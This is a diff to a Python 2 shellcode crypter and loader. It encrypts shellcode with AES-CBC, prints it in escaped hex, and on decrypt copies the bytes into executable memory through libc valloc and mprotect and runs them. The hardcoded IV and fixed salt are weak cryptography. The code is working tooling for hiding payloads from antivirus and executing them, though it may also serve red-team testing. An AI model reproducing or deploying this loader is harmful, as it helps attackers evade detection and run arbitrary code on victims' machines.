@@ -20,7 +20,7 @@ def unpadded(text):
 	return text[:-ord(text[len(text)-1:])]
 
 def Encrypt(cleartext, key):
-#	iv = urandom(AES.block_size)
+	#iv = urandom(AES.block_size)
 	iv = "1234567890123456"
 	cleartext = padding(cleartext)
 	cipher= AES.new(key, AES.MODE_CBC, iv)
@@ -36,31 +36,39 @@ def Decrypt(encrypted, key):
 
 def RunShellcode(shellcode):
 	libc = CDLL('libc.so.6')
-	sc = c_char_p(shellcode.decode('hex'))
-	size = len(shellcode.decode('hex'))
+	sc = c_char_p(shellcode)
+	size = len(shellcode)
 	addr = c_void_p(libc.valloc(size))
 	memmove(addr, sc, size)
 	libc.mprotect(addr, size, 0x7)
 	run = cast(addr, CFUNCTYPE(c_void_p))
 	run()
 
-
+def PrintShellcode(shellcode):
+	shellcode = shellcode.encode('hex')
+	shellcode_parts = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
+	print "\\x" + "\\x".join(shellcode_parts)
 
 shellcode = args.shellcode.replace('\\x', '')
 shellcodebytes = bytearray(shellcode)
 key = pyscrypt.hash(args.key, "mysalt", 1024, 1, 1, 16)
 
-print "Encrypting the shellcode"
-encrypted = Encrypt(shellcodebytes, key)
-print encrypted[AES.block_size:]
+#print "Encrypting the shellcode"
+#encrypted = Encrypt(shellcodebytes, key)
+#print encrypted[AES.block_size:]
 
-print "Decrypting the shellcode"
-decrypted = Decrypt(encrypted, key)
-print decrypted
-decrypted_parts = [decrypted[i:i+2] for i in range(0, len(decrypted), 2)]
-decrypted_shellcode = "\\x" + "\\x".join(decrypted_parts)
-print decrypted_shellcode
+#print "Decrypting the shellcode"
+#decrypted = Decrypt(encrypted, key)
+#print decrypted
+#decrypted_parts = [decrypted[i:i+2] for i in range(0, len(decrypted), 2)]
+#decrypted_shellcode = "\\x" + "\\x".join(decrypted_parts)
+#print decrypted_shellcode
+if args.encrypt:
+	encrypted = Encrypt(shellcodebytes, key)
+	PrintShellcode(encrypted)
 if args.decrypt:
+	decrypted = Decrypt(shellcode, key)
+	PrintShellcode(decrypted)
 	RunShellcode(decrypted)
 
 
